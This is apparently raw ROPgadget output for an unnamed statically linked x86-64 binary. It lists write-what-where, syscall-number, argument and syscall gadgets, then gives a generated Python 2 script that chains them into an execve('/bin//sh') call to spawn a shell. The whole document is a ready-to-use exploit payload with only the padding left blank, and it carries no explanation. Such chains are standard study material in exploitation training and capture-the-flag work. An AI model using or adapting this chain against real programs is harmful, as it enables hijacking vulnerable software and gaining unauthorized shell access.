ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x45f661 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x4016a7 pop rsi ; ret
	[+] Gadget found: 0x43167d pop rax ; ret
	[+] Gadget found: 0x41918f xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x41918f xor rax, rax ; ret
	[+] Gadget found: 0x453b50 add rax, 1 ; ret
	[+] Gadget found: 0x453b51 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x40158b pop rdi ; ret
	[+] Gadget found: 0x4016a7 pop rsi ; ret
	[+] Gadget found: 0x432ef5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x4003e7 syscall

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x00000000004016a7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b41c0) # @ .data
	p += pack('<Q', 0x000000000043167d) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000045f661) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004016a7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b41c8) # @ .data + 8
	p += pack('<Q', 0x000000000041918f) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000045f661) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040158b) # pop rdi ; ret
	p += pack('<Q', 0x00000000006b41c0) # @ .data
	p += pack('<Q', 0x00000000004016a7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b41c8) # @ .data + 8
	p += pack('<Q', 0x0000000000432ef5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006b41c8) # @ .data + 8
	p += pack('<Q', 0x000000000041918f) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000453b50) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004003e7) # syscall
